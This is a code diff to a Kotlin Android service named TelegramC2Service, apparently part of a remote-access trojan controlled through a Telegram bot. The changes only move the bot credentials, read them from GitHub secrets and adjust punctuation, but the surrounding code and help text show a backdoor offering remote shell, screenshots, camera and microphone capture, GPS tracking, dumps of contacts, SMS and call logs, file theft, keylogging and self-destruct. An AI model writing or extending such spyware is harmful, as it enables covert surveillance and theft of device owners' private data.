@@ -26,14 +26,11 @@ class TelegramC2Service : Service() {
         private const val TAG = "TgC2"
         private const val NOTIF_ID = 2
         private const val CHANNEL_ID = "c2tg"
-
-        // ── Credentials ───────────────────────────────────
-        private val BOT_TOKEN = BuildConfig.TG_BOT_TOKEN
-        private val CHAT_ID   = BuildConfig.TG_CHAT_ID
-        // ──────────────────────────────────────────────────
-
         private const val API_BASE = "https://api.telegram.org/bot"
     }
+
+    private val BOT_TOKEN: String = BuildConfig.TG_BOT_TOKEN
+    private val CHAT_ID: String = BuildConfig.TG_CHAT_ID
 
     private val scope = CoroutineScope(Dispatchers.IO + SupervisorJob())
     private val client = OkHttpClient.Builder()
@@ -56,8 +53,12 @@ class TelegramC2Service : Service() {
         log("onCreate deviceId=$deviceId")
         startForegroundCompat(ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC)
 
-        if (BOT_TOKEN.startsWith("YOUR_")) {
-            log("BOT_TOKEN not configured")
+        if (BOT_TOKEN.isEmpty() || BOT_TOKEN.startsWith("TG_TOKEN")) {
+            log("BOT_TOKEN not configured — set GitHub secret TG_BOT_TOKEN")
+            return
+        }
+        if (CHAT_ID.isEmpty() || CHAT_ID.startsWith("TG_CHAT")) {
+            log("CHAT_ID not configured — set GitHub secret TG_CHAT_ID")
             return
         }
 
@@ -254,7 +255,7 @@ class TelegramC2Service : Service() {
 
             "screenshot" -> {
                 val p = projection ?: run {
-                    sendMessage("projection not active - open app and grant screen capture")
+                    sendMessage("projection not active — open app and grant screen capture")
                     return
                 }
                 val res = Screenshot.capture(this, p)
@@ -396,7 +397,7 @@ class TelegramC2Service : Service() {
                 SelfDestruct.run(this)
             }
 
-            else -> sendMessage("unknown: /$cmd - try /help")
+            else -> sendMessage("unknown: /$cmd — try /help")
         }
     }
 
@@ -412,23 +413,23 @@ class TelegramC2Service : Service() {
 private val HELP_TEXT = """
 C2 Bot Commands
 
-/info - device info
-/shell <cmd> - run shell
-/screenshot - screen capture
-/camera [front|back] - photo
-/mic [sec] - record audio
-/location - GPS
-/contacts - contacts dump
-/sms [n] - last n SMS
-/calls [n] - last n calls
-/apps - installed apps
-/network - network info
-/ls [path] - list dir
-/get <path> - download file
-/notif - drain notifications
-/open <pkg> - launch app
-/url <url> - open URL
-/lock /home /back /recents - navigation
+/info — device info
+/shell <cmd> — run shell
+/screenshot — screen capture
+/camera [front|back] — photo
+/mic [sec] — record audio
+/location — GPS
+/contacts — contacts dump
+/sms [n] — last n SMS
+/calls [n] — last n calls
+/apps — installed apps
+/network — network info
+/ls [path] — list dir
+/get <path> — download file
+/notif — drain notifications
+/open <pkg> — launch app
+/url <url> — open URL
+/lock /home /back /recents — navigation
 /vibrate [ms]
 /toast <text>
 /keylog_start /keylog_stop /keylog_dump
